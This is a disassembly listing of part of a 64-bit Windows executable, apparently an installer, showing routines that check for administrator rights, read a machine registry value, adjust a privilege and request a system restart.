   140003328:	89 75 3f             	mov    %esi,0x3f(%rbp)
   14000332b:	8d 7e 02             	lea    0x2(%rsi),%edi
   14000332e:	66 c7 45 43 00 05    	movw   $0x500,0x43(%rbp)
   140003334:	48 89 75 37          	mov    %rsi,0x37(%rbp)
   140003338:	89 75 2b             	mov    %esi,0x2b(%rbp)
   14000333b:	3b c7                	cmp    %edi,%eax
   14000333d:	0f 85 86 01 00 00    	jne    0x1400034c9
   140003343:	48 8d 4d 2b          	lea    0x2b(%rbp),%rcx
   140003347:	e8 04 f4 ff ff       	call   0x140002750
   14000334c:	85 c0                	test   %eax,%eax
   14000334e:	0f 85 64 01 00 00    	jne    0x1400034b8
   140003354:	48 ff 15 fd 81 00 00 	rex.W call *0x81fd(%rip)        # 0x14000b558
   14000335b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003360:	48 8b c8             	mov    %rax,%rcx
   140003363:	4c 8d 45 2f          	lea    0x2f(%rbp),%r8
   140003367:	8d 56 08             	lea    0x8(%rsi),%edx
   14000336a:	48 ff 15 af 7e 00 00 	rex.W call *0x7eaf(%rip)        # 0x14000b220
   140003371:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003376:	85 c0                	test   %eax,%eax
   140003378:	0f 84 4b 01 00 00    	je     0x1400034c9
   14000337e:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   140003382:	48 8d 45 27          	lea    0x27(%rbp),%rax
   140003386:	45 33 c9             	xor    %r9d,%r9d
   140003389:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000338e:	45 33 c0             	xor    %r8d,%r8d
   140003391:	8b d7                	mov    %edi,%edx
   140003393:	48 ff 15 5e 7e 00 00 	rex.W call *0x7e5e(%rip)        # 0x14000b1f8
   14000339a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000339f:	85 c0                	test   %eax,%eax
   1400033a1:	0f 85 fc 00 00 00    	jne    0x1400034a3
   1400033a7:	48 ff 15 3a 7f 00 00 	rex.W call *0x7f3a(%rip)        # 0x14000b2e8
   1400033ae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400033b3:	83 f8 7a             	cmp    $0x7a,%eax
   1400033b6:	0f 85 e7 00 00 00    	jne    0x1400034a3
   1400033bc:	8b 55 27             	mov    0x27(%rbp),%edx
   1400033bf:	33 c9                	xor    %ecx,%ecx
   1400033c1:	48 ff 15 f8 80 00 00 	rex.W call *0x80f8(%rip)        # 0x14000b4c0
   1400033c8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400033cd:	48 8b d8             	mov    %rax,%rbx
   1400033d0:	48 85 c0             	test   %rax,%rax
   1400033d3:	0f 84 ca 00 00 00    	je     0x1400034a3
   1400033d9:	44 8b 4d 27          	mov    0x27(%rbp),%r9d
   1400033dd:	48 8d 45 27          	lea    0x27(%rbp),%rax
   1400033e1:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   1400033e5:	4c 8b c3             	mov    %rbx,%r8
   1400033e8:	8b d7                	mov    %edi,%edx
   1400033ea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400033ef:	48 ff 15 02 7e 00 00 	rex.W call *0x7e02(%rip)        # 0x14000b1f8
   1400033f6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400033fb:	85 c0                	test   %eax,%eax
   1400033fd:	0f 84 91 00 00 00    	je     0x140003494
   140003403:	48 8d 45 37          	lea    0x37(%rbp),%rax
   140003407:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   14000340d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003412:	48 8d 4d 3f          	lea    0x3f(%rbp),%rcx
   140003416:	89 74 24 48          	mov    %esi,0x48(%rsp)
   14000341a:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140003420:	89 74 24 40          	mov    %esi,0x40(%rsp)
   140003424:	40 8a d7             	mov    %dil,%dl
   140003427:	89 74 24 38          	mov    %esi,0x38(%rsp)
   14000342b:	89 74 24 30          	mov    %esi,0x30(%rsp)
   14000342f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140003433:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003437:	48 ff 15 02 7e 00 00 	rex.W call *0x7e02(%rip)        # 0x14000b240
   14000343e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003443:	85 c0                	test   %eax,%eax
   140003445:	74 4d                	je     0x140003494
   140003447:	8b fe                	mov    %esi,%edi
   140003449:	39 33                	cmp    %esi,(%rbx)
   14000344b:	76 37                	jbe    0x140003484
   14000344d:	48 8b 55 37          	mov    0x37(%rbp),%rdx
   140003451:	8b cf                	mov    %edi,%ecx
   140003453:	48 03 c9             	add    %rcx,%rcx
   140003456:	48 8b 4c cb 08       	mov    0x8(%rbx,%rcx,8),%rcx
   14000345b:	48 ff 15 ee 7d 00 00 	rex.W call *0x7dee(%rip)        # 0x14000b250
   140003462:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003467:	85 c0                	test   %eax,%eax
   140003469:	75 08                	jne    0x140003473
   14000346b:	ff c7                	inc    %edi
   14000346d:	3b 3b                	cmp    (%rbx),%edi
   14000346f:	72 dc                	jb     0x14000344d
   140003471:	eb 11                	jmp    0x140003484
   140003473:	c7 05 7f ad 00 00 01 	movl   $0x1,0xad7f(%rip)        # 0x14000e1fc
   14000347a:	00 00 00 
   14000347d:	c7 45 2b 01 00 00 00 	movl   $0x1,0x2b(%rbp)
   140003484:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   140003488:	48 ff 15 89 7d 00 00 	rex.W call *0x7d89(%rip)        # 0x14000b218
   14000348f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003494:	48 8b cb             	mov    %rbx,%rcx
   140003497:	48 ff 15 ba 7e 00 00 	rex.W call *0x7eba(%rip)        # 0x14000b358
   14000349e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034a3:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   1400034a7:	48 ff 15 72 7e 00 00 	rex.W call *0x7e72(%rip)        # 0x14000b320
   1400034ae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034b3:	8b 45 2b             	mov    0x2b(%rbp),%eax
   1400034b6:	eb 11                	jmp    0x1400034c9
   1400034b8:	8b 45 2b             	mov    0x2b(%rbp),%eax
   1400034bb:	85 c0                	test   %eax,%eax
   1400034bd:	74 0a                	je     0x1400034c9
   1400034bf:	c7 05 33 ad 00 00 01 	movl   $0x1,0xad33(%rip)        # 0x14000e1fc
   1400034c6:	00 00 00 
   1400034c9:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   1400034cd:	48 33 cc             	xor    %rsp,%rcx
   1400034d0:	e8 db 66 00 00       	call   0x140009bb0
   1400034d5:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400034dc:	00 
   1400034dd:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400034e1:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400034e5:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400034e9:	49 8b e3             	mov    %r11,%rsp
   1400034ec:	5d                   	pop    %rbp
   1400034ed:	c3                   	ret
   1400034ee:	cc                   	int3
   1400034ef:	cc                   	int3
   1400034f0:	cc                   	int3
   1400034f1:	cc                   	int3
   1400034f2:	cc                   	int3
   1400034f3:	cc                   	int3
   1400034f4:	cc                   	int3
   1400034f5:	cc                   	int3
   1400034f6:	cc                   	int3
   1400034f7:	cc                   	int3
   1400034f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400034fd:	57                   	push   %rdi
   1400034fe:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140003505:	48 8b 05 74 ab 00 00 	mov    0xab74(%rip),%rax        # 0x14000e080
   14000350c:	48 33 c4             	xor    %rsp,%rax
   14000350f:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140003516:	00 
   140003517:	48 8b f9             	mov    %rcx,%rdi
   14000351a:	ba 04 01 00 00       	mov    $0x104,%edx
   14000351f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003524:	48 ff 15 0d 7e 00 00 	rex.W call *0x7e0d(%rip)        # 0x14000b338
   14000352b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003530:	33 db                	xor    %ebx,%ebx
   140003532:	85 c0                	test   %eax,%eax
   140003534:	75 1e                	jne    0x140003554
   140003536:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000353a:	45 33 c9             	xor    %r9d,%r9d
   14000353d:	45 33 c0             	xor    %r8d,%r8d
   140003540:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003547:	00 
   140003548:	ba f0 04 00 00       	mov    $0x4f0,%edx
   14000354d:	33 c9                	xor    %ecx,%ecx
   14000354f:	e8 84 2e 00 00       	call   0x1400063d8
   140003554:	8a 4c 24 30          	mov    0x30(%rsp),%cl
   140003558:	38 0f                	cmp    %cl,(%rdi)
   14000355a:	0f 94 c3             	sete   %bl
   14000355d:	8b c3                	mov    %ebx,%eax
   14000355f:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   140003566:	00 
   140003567:	48 33 cc             	xor    %rsp,%rcx
   14000356a:	e8 41 66 00 00       	call   0x140009bb0
   14000356f:	48 8b 9c 24 60 01 00 	mov    0x160(%rsp),%rbx
   140003576:	00 
   140003577:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   14000357e:	5f                   	pop    %rdi
   14000357f:	c3                   	ret
   140003580:	cc                   	int3
   140003581:	cc                   	int3
   140003582:	cc                   	int3
   140003583:	cc                   	int3
   140003584:	cc                   	int3
   140003585:	cc                   	int3
   140003586:	cc                   	int3
   140003587:	cc                   	int3
   140003588:	40 53                	rex push %rbx
   14000358a:	48 83 ec 50          	sub    $0x50,%rsp
   14000358e:	48 8b 05 eb aa 00 00 	mov    0xaaeb(%rip),%rax        # 0x14000e080
   140003595:	48 33 c4             	xor    %rsp,%rax
   140003598:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000359d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400035a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400035a6:	0f 11 44 24 38       	movups %xmm0,0x38(%rsp)
   1400035ab:	48 ff 15 a6 7f 00 00 	rex.W call *0x7fa6(%rip)        # 0x14000b558
   1400035b2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035b7:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400035bc:	ba 28 00 00 00       	mov    $0x28,%edx
   1400035c1:	48 8b c8             	mov    %rax,%rcx
   1400035c4:	48 ff 15 55 7c 00 00 	rex.W call *0x7c55(%rip)        # 0x14000b220
   1400035cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035d0:	33 c9                	xor    %ecx,%ecx
   1400035d2:	85 c0                	test   %eax,%eax
   1400035d4:	75 23                	jne    0x1400035f9
   1400035d6:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400035da:	45 33 c9             	xor    %r9d,%r9d
   1400035dd:	45 33 c0             	xor    %r8d,%r8d
   1400035e0:	ba f5 04 00 00       	mov    $0x4f5,%edx
   1400035e5:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400035ec:	00 
   1400035ed:	e8 e6 2d 00 00       	call   0x1400063d8
   1400035f2:	33 c0                	xor    %eax,%eax
   1400035f4:	e9 9e 00 00 00       	jmp    0x140003697
   1400035f9:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   1400035fe:	48 8d 15 bb 82 00 00 	lea    0x82bb(%rip),%rdx        # 0x14000b8c0
   140003605:	48 ff 15 2c 7c 00 00 	rex.W call *0x7c2c(%rip)        # 0x14000b238
   14000360c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003611:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003616:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000361b:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140003621:	45 33 c9             	xor    %r9d,%r9d
   140003624:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000362a:	33 d2                	xor    %edx,%edx
   14000362c:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140003633:	00 
   140003634:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
   14000363b:	00 
   14000363c:	48 ff 15 1d 7c 00 00 	rex.W call *0x7c1d(%rip)        # 0x14000b260
   140003643:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003648:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000364d:	8b d8                	mov    %eax,%ebx
   14000364f:	48 ff 15 ca 7c 00 00 	rex.W call *0x7cca(%rip)        # 0x14000b320
   140003656:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000365b:	85 db                	test   %ebx,%ebx
   14000365d:	75 17                	jne    0x140003676
   14000365f:	ba f6 04 00 00       	mov    $0x4f6,%edx
   140003664:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140003669:	45 33 c9             	xor    %r9d,%r9d
   14000366c:	45 33 c0             	xor    %r8d,%r8d
   14000366f:	33 c9                	xor    %ecx,%ecx
   140003671:	e9 6f ff ff ff       	jmp    0x1400035e5
   140003676:	33 d2                	xor    %edx,%edx
   140003678:	8d 4a 02             	lea    0x2(%rdx),%ecx
   14000367b:	48 ff 15 56 7f 00 00 	rex.W call *0x7f56(%rip)        # 0x14000b5d8
   140003682:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003687:	85 c0                	test   %eax,%eax
   140003689:	75 07                	jne    0x140003692
   14000368b:	ba f7 04 00 00       	mov    $0x4f7,%edx
   140003690:	eb d2                	jmp    0x140003664
   140003692:	b8 01 00 00 00       	mov    $0x1,%eax
   140003697:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000369c:	48 33 cc             	xor    %rsp,%rcx
   14000369f:	e8 0c 65 00 00       	call   0x140009bb0
   1400036a4:	48 83 c4 50          	add    $0x50,%rsp
   1400036a8:	5b                   	pop    %rbx
   1400036a9:	c3                   	ret
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	cc                   	int3
   1400036ad:	cc                   	int3
   1400036ae:	cc                   	int3
   1400036af:	cc                   	int3
   1400036b0:	cc                   	int3
   1400036b1:	cc                   	int3
   1400036b2:	cc                   	int3
   1400036b3:	cc                   	int3
   1400036b4:	40 53                	rex push %rbx
   1400036b6:	48 83 ec 30          	sub    $0x30,%rsp
   1400036ba:	33 db                	xor    %ebx,%ebx
   1400036bc:	0f b7 d1             	movzwl %cx,%edx
   1400036bf:	85 d2                	test   %edx,%edx
   1400036c1:	0f 84 a4 00 00 00    	je     0x14000376b
   1400036c7:	83 ea 01             	sub    $0x1,%edx
   1400036ca:	0f 84 94 00 00 00    	je     0x140003764
   1400036d0:	83 ea 01             	sub    $0x1,%edx
   1400036d3:	74 09                	je     0x1400036de
   1400036d5:	83 fa 01             	cmp    $0x1,%edx
   1400036d8:	0f 85 94 00 00 00    	jne    0x140003772
   1400036de:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400036e3:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400036e8:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   1400036ee:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400036f3:	45 33 c0             	xor    %r8d,%r8d
   1400036f6:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   1400036fa:	48 8d 15 cf a9 00 00 	lea    0xa9cf(%rip),%rdx        # 0x14000e0d0
   140003701:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140003708:	48 ff 15 f9 7a 00 00 	rex.W call *0x7af9(%rip)        # 0x14000b208
   14000370f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003714:	85 c0                	test   %eax,%eax
   140003716:	75 46                	jne    0x14000375e
   140003718:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000371d:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003722:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003727:	48 8d 15 8a aa 00 00 	lea    0xaa8a(%rip),%rdx        # 0x14000e1b8
   14000372e:	45 33 c9             	xor    %r9d,%r9d
   140003731:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003736:	45 33 c0             	xor    %r8d,%r8d
   140003739:	48 ff 15 08 7b 00 00 	rex.W call *0x7b08(%rip)        # 0x14000b248
   140003740:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003745:	85 c0                	test   %eax,%eax
   140003747:	74 04                	je     0x14000374d
   140003749:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   14000374d:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003752:	48 ff 15 ff 7a 00 00 	rex.W call *0x7aff(%rip)        # 0x14000b258
   140003759:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000375e:	8b 5c 24 40          	mov    0x40(%rsp),%ebx
   140003762:	eb 0e                	jmp    0x140003772
   140003764:	e8 f7 f9 ff ff       	call   0x140003160
   140003769:	eb 05                	jmp    0x140003770
   14000376b:	e8 ac fa ff ff       	call   0x14000321c
   140003770:	8b d8                	mov    %eax,%ebx
   140003772:	8b c3                	mov    %ebx,%eax
   140003774:	48 83 c4 30          	add    $0x30,%rsp
   140003778:	5b                   	pop    %rbx
   140003779:	c3                   	ret
   14000377a:	cc                   	int3
   14000377b:	cc                   	int3
   14000377c:	cc                   	int3
   14000377d:	cc                   	int3
   14000377e:	cc                   	int3
   14000377f:	cc                   	int3
   140003780:	cc                   	int3
   140003781:	cc                   	int3
   140003782:	cc                   	int3
   140003783:	cc                   	int3
   140003784:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003789:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000378d:	4d 8b d8             	mov    %r8,%r11
   140003790:	4c 8b ca             	mov    %rdx,%r9
   140003793:	48 8b d9             	mov    %rcx,%rbx
   140003796:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   14000379c:	0f 87 91 00 00 00    	ja     0x140003833
   1400037a2:	4c 8b d2             	mov    %rdx,%r10
   1400037a5:	48 8b c1             	mov    %rcx,%rax
   1400037a8:	80 38 00             	cmpb   $0x0,(%rax)
   1400037ab:	74 09                	je     0x1400037b6
   1400037ad:	48 ff c0             	inc    %rax
   1400037b0:	49 83 ea 01          	sub    $0x1,%r10
   1400037b4:	75 f2                	jne    0x1400037a8
   1400037b6:	49 8b c2             	mov    %r10,%rax
   1400037b9:	49 8b c9             	mov    %r9,%rcx
   1400037bc:	48 f7 d8             	neg    %rax
   1400037bf:	49 8b c2             	mov    %r10,%rax
   1400037c2:	1b d2                	sbb    %edx,%edx
   1400037c4:	49 2b ca             	sub    %r10,%rcx
   1400037c7:	f7 d2                	not    %edx
   1400037c9:	81 e2 57 00 07 80    	and    $0x80070057,%edx
   1400037cf:	48 f7 d8             	neg    %rax
   1400037d2:	4d 1b c0             	sbb    %r8,%r8
   1400037d5:	4c 23 c1             	and    %rcx,%r8
   1400037d8:	4d 85 d2             	test   %r10,%r10
   1400037db:	74 5b                	je     0x140003838
   1400037dd:	49 8b c9             	mov    %r9,%rcx
   1400037e0:	49 8d 14 18          	lea    (%r8,%rbx,1),%rdx
   1400037e4:	49 2b c8             	sub    %r8,%rcx
   1400037e7:	74 2d                	je     0x140003816
   1400037e9:	4d 2b c1             	sub    %r9,%r8
   1400037ec:	49 8d 80 fe ff ff 7f 	lea    0x7ffffffe(%r8),%rax
   1400037f3:	48 03 c1             	add    %rcx,%rax
   1400037f6:	4c 2b da             	sub    %rdx,%r11
   1400037f9:	48 85 c0             	test   %rax,%rax
   1400037fc:	74 18                	je     0x140003816
   1400037fe:	45 8a 04 13          	mov    (%r11,%rdx,1),%r8b
   140003802:	45 84 c0             	test   %r8b,%r8b
   140003805:	74 0f                	je     0x140003816
   140003807:	44 88 02             	mov    %r8b,(%rdx)
   14000380a:	48 ff c8             	dec    %rax
   14000380d:	48 ff c2             	inc    %rdx
   140003810:	48 83 e9 01          	sub    $0x1,%rcx
   140003814:	75 e3                	jne    0x1400037f9
   140003816:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000381a:	48 85 c9             	test   %rcx,%rcx
   14000381d:	48 0f 45 c2          	cmovne %rdx,%rax
   140003821:	48 f7 d9             	neg    %rcx
   140003824:	1b d2                	sbb    %edx,%edx
   140003826:	f7 d2                	not    %edx
   140003828:	81 e2 7a 00 07 80    	and    $0x8007007a,%edx
   14000382e:	c6 00 00             	movb   $0x0,(%rax)
   140003831:	eb 05                	jmp    0x140003838
   140003833:	ba 57 00 07 80       	mov    $0x80070057,%edx
   140003838:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000383d:	8b c2                	mov    %edx,%eax
   14000383f:	c3                   	ret
   140003840:	cc                   	int3
   140003841:	cc                   	int3
   140003842:	cc                   	int3
   140003843:	cc                   	int3
   140003844:	cc                   	int3
   140003845:	cc                   	int3
   140003846:	cc                   	int3
   140003847:	cc                   	int3
   140003848:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000384d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003852:	53                   	push   %rbx
   140003853:	56                   	push   %rsi
   140003854:	57                   	push   %rdi
   140003855:	48 83 ec 30          	sub    $0x30,%rsp
   140003859:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000385d:	48 8b f1             	mov    %rcx,%rsi
   140003860:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   140003866:	76 0f                	jbe    0x140003877
   140003868:	bb 57 00 07 80       	mov    $0x80070057,%ebx
   14000386d:	48 85 d2             	test   %rdx,%rdx
   140003870:	74 39                	je     0x1400038ab
   140003872:	c6 01 00             	movb   $0x0,(%rcx)
   140003875:	eb 34                	jmp    0x1400038ab
   140003877:	48 8d 7a ff          	lea    -0x1(%rdx),%rdi
   14000387b:	33 db                	xor    %ebx,%ebx
   14000387d:	48 8b d7             	mov    %rdi,%rdx
   140003880:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   140003885:	48 ff 15 9c 7e 00 00 	rex.W call *0x7e9c(%rip)        # 0x14000b728
   14000388c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003891:	85 c0                	test   %eax,%eax
   140003893:	78 0e                	js     0x1400038a3
   140003895:	48 98                	cltq
   140003897:	48 3b c7             	cmp    %rdi,%rax
   14000389a:	77 07                	ja     0x1400038a3
   14000389c:	75 0d                	jne    0x1400038ab
   14000389e:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   1400038a1:	eb 08                	jmp    0x1400038ab
   1400038a3:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   1400038a6:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
   1400038ab:	8b c3                	mov    %ebx,%eax
   1400038ad:	48 83 c4 30          	add    $0x30,%rsp
   1400038b1:	5f                   	pop    %rdi
   1400038b2:	5e                   	pop    %rsi
   1400038b3:	5b                   	pop    %rbx
   1400038b4:	c3                   	ret
   1400038b5:	cc                   	int3
   1400038b6:	cc                   	int3
   1400038b7:	cc                   	int3
   1400038b8:	cc                   	int3
   1400038b9:	cc                   	int3
   1400038ba:	cc                   	int3
   1400038bb:	cc                   	int3
   1400038bc:	cc                   	int3
   1400038bd:	cc                   	int3
   1400038be:	cc                   	int3
   1400038bf:	cc                   	int3
   1400038c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400038c5:	57                   	push   %rdi
   1400038c6:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   1400038cd:	48 8b 05 ac a7 00 00 	mov    0xa7ac(%rip),%rax        # 0x14000e080
   1400038d4:	48 33 c4             	xor    %rsp,%rax
   1400038d7:	48 89 84 24 20 02 00 	mov    %rax,0x220(%rsp)
   1400038de:	00 
   1400038df:	49 8b f9             	mov    %r9,%rdi
   1400038e2:	48 8b d9             	mov    %rcx,%rbx
   1400038e5:	81 ea 10 01 00 00    	sub    $0x110,%edx
   1400038eb:	74 2b                	je     0x140003918
   1400038ed:	83 fa 01             	cmp    $0x1,%edx
   1400038f0:	75 11                	jne    0x140003903
   1400038f2:	49 8b c0             	mov    %r8,%rax
   1400038f5:	48 2d 3d 08 00 00    	sub    $0x83d,%rax
   1400038fb:	74 0a                	je     0x140003907
   1400038fd:	48 83 f8 01          	cmp    $0x1,%rax
   140003901:	74 04                	je     0x140003907
   140003903:	33 c0                	xor    %eax,%eax
   140003905:	eb 7a                	jmp    0x140003981
   140003907:	49 8b d0             	mov    %r8,%rdx
   14000390a:	48 ff 15 d7 7c 00 00 	rex.W call *0x7cd7(%rip)        # 0x14000b5e8
   140003911:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003916:	eb 64                	jmp    0x14000397c
   140003918:	48 ff 15 a1 7c 00 00 	rex.W call *0x7ca1(%rip)        # 0x14000b5c0
   14000391f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003924:	48 8b d0             	mov    %rax,%rdx
   140003927:	48 8b cb             	mov    %rbx,%rcx
   14000392a:	e8 f9 04 00 00       	call   0x140003e28
   14000392f:	48 8b 0d 7a c6 00 00 	mov    0xc67a(%rip),%rcx        # 0x14000ffb0
   140003936:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000393b:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140003941:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140003946:	8b d7                	mov    %edi,%edx
   140003948:	48 ff 15 a9 7c 00 00 	rex.W call *0x7ca9(%rip)        # 0x14000b5f8
   14000394f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003954:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140003959:	ba 3f 08 00 00       	mov    $0x83f,%edx
   14000395e:	48 8b cb             	mov    %rbx,%rcx
   140003961:	48 ff 15 68 7c 00 00 	rex.W call *0x7c68(%rip)        # 0x14000b5d0
   140003968:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000396d:	83 c9 ff             	or     $0xffffffff,%ecx
   140003970:	48 ff 15 69 7c 00 00 	rex.W call *0x7c69(%rip)        # 0x14000b5e0
   140003977:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000397c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003981:	48 8b 8c 24 20 02 00 	mov    0x220(%rsp),%rcx
   140003988:	00 
   140003989:	48 33 cc             	xor    %rsp,%rcx
   14000398c:	e8 1f 62 00 00       	call   0x140009bb0
   140003991:	48 8b 9c 24 48 02 00 	mov    0x248(%rsp),%rbx
   140003998:	00 
   140003999:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   1400039a0:	5f                   	pop    %rdi
   1400039a1:	c3                   	ret
   1400039a2:	cc                   	int3
   1400039a3:	cc                   	int3
   1400039a4:	cc                   	int3
   1400039a5:	cc                   	int3
   1400039a6:	cc                   	int3
   1400039a7:	cc                   	int3
   1400039a8:	cc                   	int3
   1400039a9:	cc                   	int3
   1400039aa:	cc                   	int3
   1400039ab:	cc                   	int3
   1400039ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400039b1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400039b6:	57                   	push   %rdi
   1400039b7:	48 83 ec 30          	sub    $0x30,%rsp
   1400039bb:	ba 10 00 00 00       	mov    $0x10,%edx
   1400039c0:	48 8b f1             	mov    %rcx,%rsi
   1400039c3:	8d 4a 30             	lea    0x30(%rdx),%ecx
   1400039c6:	48 ff 15 f3 7a 00 00 	rex.W call *0x7af3(%rip)        # 0x14000b4c0
   1400039cd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400039d2:	48 8b f8             	mov    %rax,%rdi
   1400039d5:	48 85 c0             	test   %rax,%rax
   1400039d8:	75 2a                	jne    0x140003a04
   1400039da:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400039de:	45 33 c9             	xor    %r9d,%r9d
   1400039e1:	48 8b 0d 00 af 00 00 	mov    0xaf00(%rip),%rcx        # 0x14000e8e8
   1400039e8:	45 33 c0             	xor    %r8d,%r8d
   1400039eb:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400039f0:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400039f7:	00 
   1400039f8:	e8 db 29 00 00       	call   0x1400063d8
   1400039fd:	33 c0                	xor    %eax,%eax
   1400039ff:	e9 cb 00 00 00       	jmp    0x140003acf
   140003a04:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140003a08:	48 8b d3             	mov    %rbx,%rdx
   140003a0b:	48 ff c2             	inc    %rdx
   140003a0e:	80 3c 16 00          	cmpb   $0x0,(%rsi,%rdx,1)
   140003a12:	75 f7                	jne    0x140003a0b
   140003a14:	48 ff c2             	inc    %rdx
   140003a17:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003a1c:	48 ff 15 9d 7a 00 00 	rex.W call *0x7a9d(%rip)        # 0x14000b4c0
   140003a23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a28:	48 89 07             	mov    %rax,(%rdi)
   140003a2b:	48 8b d0             	mov    %rax,%rdx
